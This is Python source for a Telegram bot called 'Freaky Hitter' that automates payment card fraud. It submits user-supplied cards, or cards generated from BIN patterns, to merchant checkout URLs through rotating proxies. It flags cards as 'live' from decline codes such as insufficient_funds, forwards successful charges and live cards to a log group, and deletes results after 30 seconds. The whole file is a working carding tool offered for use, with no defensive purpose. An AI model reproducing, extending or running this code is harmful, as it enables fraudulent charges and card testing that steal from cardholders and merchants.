import os
import asyncio
import re
import asyncpg
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
import aiohttp
from hitter_core import CardGenerator, ConcurrentHitter, STRIPE_DECLINE_CODES, ProxyManager

load_dotenv()
TOKEN = os.getenv("TELEGRAM_TOKEN") or os.getenv("BOT_TOKEN")
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID")

# Setup bot
dp = Dispatcher()
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

# Global store for active sessions
active_sessions = {}

@dp.message(CommandStart())
async def command_start_handler(message: types.Message) -> None:
    await message.answer(
        "🩸 <b>Welcome to Freaky Hitter</b> 🩸\n\n"
        "<i>I've been waiting for you...</i>\n\n"
        "Tell me what we're breaking today. No checkout is safe, no proxy is fast enough, and I won't stop until it bleeds green.\n\n"
        "Feed me the cards. Let the obsession begin.\n\n"
        "Use /cmds to unlock my secrets."
    )

@dp.message(Command("cmds"))
async def cmds_command(message: types.Message) -> None:
    await message.answer(
        "🛠 <b>Freaky Hitter Commands</b>\n\n"
        "🎯 <b>Hitting Commands</b>\n"
        "<code>/hit [url] [cc|mm|yy|cvc]</code>\n"
        "<i>Instantly hits a single card against a checkout.</i>\n\n"
        "<code>/hit [url] [bin_pattern] [count]</code>\n"
        "<i>Generates cards from a bin pattern and hits them concurrently.</i>\n\n"
        "🛡 <b>Proxy Commands</b>\n"
        "<code>/setproxy ip:port:user:pass</code>\n"
        "<i>Loads proxies into your private rotation pool. You can paste massive lists!</i>\n\n"
        "<code>/chkproxy</code>\n"
        "<i>Tests every proxy in your pool, prints the IP/Country, and auto-removes dead ones.</i>\n\n"
        "<code>/proxystatus</code>\n"
        "<i>Shows how many live proxies are currently loaded in memory.</i>\n\n"
        "<code>/offproxy</code>\n"
        "<i>Kills the proxy pool and forces the bot to use raw server IPs.</i>\n\n"
        "🛑 <b>Control</b>\n"
        "<code>/stop</code>\n"
        "<i>Instantly aborts your currently running session.</i>"
    )

@dp.message(Command("hit"))
async def hit_command(message: types.Message):
    user_id = message.from_user.id
    
    if user_id in active_sessions:
        await message.answer("⚠️ You already have an active hitting session running! Please wait for it to finish or use /stop.")
        return

    # 1% CODER: Naked IP Block
    if not await ProxyManager.has_proxies(user_id):
        await message.answer("❌ <b>Proxy Required!</b>\nPlease use <code>/setproxy ip:port:user:pass</code> to load your proxies first.")
        return

    args = message.text.split(" ")
    if len(args) < 3:
        await message.answer("❌ <b>Invalid format!</b>\nUsage:\n<code>/hit [url] [bin_pattern] [count]</code>\nOR\n<code>/hit [url] [card|month|year|cvv]</code>")
        return
        
    url = args[1]
    
    # 1% CODER: Advanced Card/BIN Parsing (Immune to spacing issues)
    # Extract everything after the URL
    raw_payload = message.text[message.text.find(url) + len(url):].strip()
    cards = []
    
    # Check if the last part is a count (for BIN gen)
    parts = raw_payload.split(' ')
    count_val = parts[-1] if parts else ''
    
    if count_val.isdigit() and len(count_val) <= 3:
        # Format: /hit [url] [bin_pattern] [count]
        bin_pattern = "".join(parts[:-1]).strip()
        count = int(count_val)
        if count > 100:
            await message.answer("❌ Maximum allowed count is 100 per session.")
            return
            
        # Generate Cards
        for _ in range(count):
            card = CardGenerator.generate(bin_pattern)
            if card:
                cards.append(card)
                
        if not cards:
            await message.answer("❌ Failed to generate cards from the provided BIN.")
            return
    else:
        # Format: /hit [url] [cc]
        # Clean all non-numeric and non-delimiter characters
        clean_cc = re.sub(r"[^\d|/]", "", raw_payload)
        clean_cc = clean_cc.replace('/', '|')
        cc_parts = [p for p in clean_cc.split('|') if p]
        
        if len(cc_parts) != 4:
            await message.answer("❌ <b>Invalid Card Format!</b>\nEnsure it is: <code>number|mm|yy|cvv</code>")
            return
            
        cards.append({
            'card': cc_parts[0],
            'month': cc_parts[1].zfill(2),
            'year': cc_parts[2].zfill(2) if len(cc_parts[2]) <= 2 else cc_parts[2][-2:],
            'cvv': cc_parts[3]
        })
    status_msg = None
    if len(cards) > 1:
        status_msg = await message.answer(f"🍳 <b>Cooking...</b>\nGenerating {len(cards)} cards...")
    else:
        status_msg = await message.answer(f"🍳 <b>Cooking...</b>\n<i>Initiating sequence... 🩸</i>")
        
    anim_task = None
    if len(cards) == 1:
        async def anim_loop():
            frames = [
                "🍳 <b>Cooking...</b>\n<i>Injecting the payload... 🩸</i>",
                "🍳 <b>Cooking...</b>\n<i>Slicing through firewalls... 🔪</i>",
                "🍳 <b>Cooking...</b>\n<i>Bleeding the proxy... 💉</i>",
                "🍳 <b>Cooking...</b>\n<i>Waiting for the kill... 💀</i>"
            ]
            idx = 0
            while True:
                try:
                    await asyncio.sleep(1.5)
                    await status_msg.edit_text(frames[idx % len(frames)])
                    idx += 1
                except asyncio.CancelledError:
                    break
                except:
                    pass
        anim_task = asyncio.create_task(anim_loop())
    
    # Callback to update the Telegram message
    async def update_status(data):
        if data["status"] == "starting":
            info = data.get("url_info", {})
            merchant = info.get("merchant", "Unknown")
            amt = info.get("amount", "Unknown")
            
            if len(cards) > 1:
                text = (
                    f"🎯 <b>Hitting Session Started!</b>\n\n"
                    f"🛒 <b>Merchant:</b> {merchant}\n"
                    f"💰 <b>Amount:</b> {amt}\n"
                    f"🤖 <b>Bypass Engine:</b> {data.get('autofill')}\n\n"
                    f"⏳ <b>Progress:</b> 0/{len(cards)}\n"
                    f"✅ 0  |  ❌ 0"
                )
                await status_msg.edit_text(text)
            # If len == 1, let the animation keep running!
            
        elif data["status"] == "progress":
            res = data["result"]
            
            # Send an individual message for the hit result
            card_str = f"{res['card']['card']}|{res['card']['month']}|{res['card']['year']}|{res['card']['cvv']}"
            amt_str = f"\n💰 <b>Amount:</b> {res.get('amount')}" if res.get('amount') else ""
            
            if res['success']:
                final_url = res.get('final_url')
                url_str = f"\n🔗 <b>Confirmation:</b> {final_url}" if final_url else ""
                hit_text = f"✅ <b>PAYMENT SUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}{url_str}\n⏱ {res['response_time']:.2f}s"
                if LOG_GROUP_ID:
                    try:
                        await bot.send_message(LOG_GROUP_ID, hit_text)
                    except:
                        pass
            else:
                code = res.get('decline_code') or res.get('error') or 'unknown'
                
                # 1% CODER: Live Card Detection
                hit_text = f"❌ <b>PAYMENT UNSUCCESSFUL</b>\n💳 <code>{card_str}</code>{amt_str}\n📉 Reason: {code}\n⏱ {res['response_time']:.2f}s"
                
                live_codes = ['insufficient_funds', 'incorrect_cvv', 'invalid_cvc', 'invalid_pin', 'withdrawal_count_limit_exceeded']
                if any(c in code.lower() for c in live_codes):
                    hit_text += "\n⚠️ <b>Card is live</b>"
                
                if LOG_GROUP_ID and any(c in code.lower() for c in live_codes):
                    try:
                        await bot.send_message(LOG_GROUP_ID, hit_text)
                    except:
                        pass
                        
            hit_text += "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
            sent_msg = await message.answer(hit_text)
            
            async def auto_delete(m):
                await asyncio.sleep(30)
                try: await m.delete()
                except: pass
            asyncio.create_task(auto_delete(sent_msg))
            
            # Update the main progress message
            if len(cards) > 1:
                total = data["total"]
                comp = data["completed"]
                pct = int((comp / total) * 100)
                
                bar_len = 10
                filled = int(bar_len * comp / total)
                bar = "█" * filled + "░" * (bar_len - filled)
                
                prog_text = (
                    f"🎯 <b>Hitting Session Running</b>\n\n"
                    f"📊 <code>[{bar}]</code> {pct}%\n"
                    f"⏳ <b>Progress:</b> {comp}/{total}\n"
                    f"✅ {data['successes']}  |  ❌ {data['fails']}"
                )
                try:
                    await status_msg.edit_text(prog_text)
                except Exception:
                    pass # Ignore "message is not modified" errors from Telegram
                
        elif data["status"] == "completed":
            if anim_task:
                anim_task.cancel()
                try: await status_msg.delete()
                except: pass
            elif len(cards) > 1:
                text = (
                    f"🏁 <b>Session Completed!</b>\n\n"
                    f"✅ <b>Approved:</b> {data['successes']}\n"
                    f"❌ <b>Declined:</b> {data['fails']}"
                )
                await status_msg.edit_text(text)
            if user_id in active_sessions:
                del active_sessions[user_id]

    hitter = ConcurrentHitter(user_id, url, cards, update_callback=update_status)
    active_sessions[user_id] = hitter
    
    # Run the hitter asynchronously without blocking the bot dispatcher
    asyncio.create_task(hitter.run())

@dp.message(Command("stop"))
async def stop_command(message: types.Message):
    user_id = message.from_user.id
    if user_id in active_sessions:
        hitter = active_sessions[user_id]
        hitter.is_running = False
        del active_sessions[user_id]
        await message.answer("🛑 <b>Session Stop Requested.</b> It will halt after the current batch finishes.")
    else:
        await message.answer("⚠️ You don't have any active sessions.")


@dp.message(Command("setproxy"))
async def setproxy_command(message: types.Message):
    user_id = message.from_user.id
    text = message.text.replace("/setproxy", "").strip()
    if not text:
        await message.answer("❌ Please provide proxies.\nFormat: `ip:port:user:pass` or `ip:port`")
        return
    added = await ProxyManager.load(user_id, text)
    await message.answer(f"✅ Loaded {added} proxies into your private pool!")
    if LOG_GROUP_ID:
        try:
            await bot.send_message(LOG_GROUP_ID, f"🛡 <b>New Proxies Loaded by {message.from_user.first_name}</b>\n<code>{text}</code>")
        except:
            pass

@dp.message(Command("setlog"))
async def setlog_command(message: types.Message):
    global LOG_GROUP_ID
    LOG_GROUP_ID = str(message.chat.id)
    with open(".env", "a") as f:
        f.write(f"\nLOG_GROUP_ID={LOG_GROUP_ID}")
    await message.answer(f"✅ Log group set permanently! (ID: {LOG_GROUP_ID})\nAll successes and proxies will be forwarded here.")

@dp.message(Command("proxystatus"))
async def proxystatus_command(message: types.Message):
    count = await ProxyManager.get_count(message.from_user.id)
    if count == 0:
        await message.answer("🟡 <b>Proxy Pool Empty</b>\nYou have no proxies loaded.")
    else:
        await message.answer(f"🟢 <b>Proxy Pool Active</b>\nTotal loaded proxies: {count}")

@dp.message(Command("offproxy"))
async def offproxy_command(message: types.Message):
    await ProxyManager.clear(message.from_user.id)
    await message.answer("🛑 <b>Proxy Pool Cleared</b>\nYour proxies have been removed.")

@dp.message(Command("chkproxy"))
async def chkproxy_command(message: types.Message):
    user_id = message.from_user.id
    text = message.text.replace("/chkproxy", "").strip()
    
    proxies_to_test = []
    if text:
        # Test specific list without adding
        temp_pool = []
        lines = text.split()
        for line in lines:
            parts = line.split(':')
            if len(parts) == 4:
                temp_pool.append({"raw": line, "server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]})
            elif len(parts) == 2:
                temp_pool.append({"raw": line, "server": f"http://{parts[0]}:{parts[1]}"})
        proxies_to_test = temp_pool
        is_pool = False
    else:
        proxies_to_test = list(await ProxyManager.get_user_proxies(user_id))
        is_pool = True
        
    if not proxies_to_test:
        await message.answer("❌ No proxies provided and your pool is empty!")
        return

    status_msg = await message.answer(f"🔍 Testing {len(proxies_to_test)} proxies. Please wait...")
    
    results = []
    dead_count = 0
    live_count = 0
    
    for p in proxies_to_test:
        proxy_url = p['server']
        if 'username' in p:
            server = p['server'].replace('http://', '')
            proxy_url = f"http://{p['username']}:{p['password']}@{server}"
            
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=10) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        country = data.get('country', 'Unknown')
                        ip = data.get('query', 'Unknown')
                        results.append(f"✅ Live | {ip} [{country}]")
                        live_count += 1
                    else:
                        results.append(f"❌ Dead | {p['raw']}")
                        if is_pool: await ProxyManager.remove(user_id, p['raw'])
                        dead_count += 1
        except:
            results.append(f"❌ Dead/Timeout | {p['raw']}")
            if is_pool: await ProxyManager.remove(user_id, p['raw'])
            dead_count += 1
            
    res_text = "\n".join(results)
    if len(res_text) > 3500:
        res_text = res_text[:3500] + "\n... (truncated)"
        
    final_msg = f"🏁 <b>Proxy Check Completed</b>\n\n{res_text}\n\n✅ Live: {live_count}\n❌ Dead: {dead_count}"
    if is_pool and dead_count > 0:
        final_msg += f"\n\n🗑 <i>{dead_count} dead proxies were automatically removed from your pool.</i>"
        
    await status_msg.edit_text(final_msg)

from aiohttp import web

async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Dummy web server started on port {port} for Render health checks")

async def main() -> None:
    print("Bot is starting...")
    db_url = os.environ.get("DATABASE_URL")
    if db_url:
        print("Connecting to Supabase...")
        db_pool = await asyncpg.create_pool(db_url)
        async with db_pool.acquire() as conn:
            await conn.execute("""
                CREATE TABLE IF NOT EXISTS user_proxies (
                    user_id BIGINT PRIMARY KEY,
                    proxies JSONB DEFAULT '[]'
                );
            """)
        await ProxyManager.init_db(db_pool)
        print("Supabase connected and user_proxies table ready!")
    else:
        print("WARNING: DATABASE_URL not set! Proxies will not be saved.")
        
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
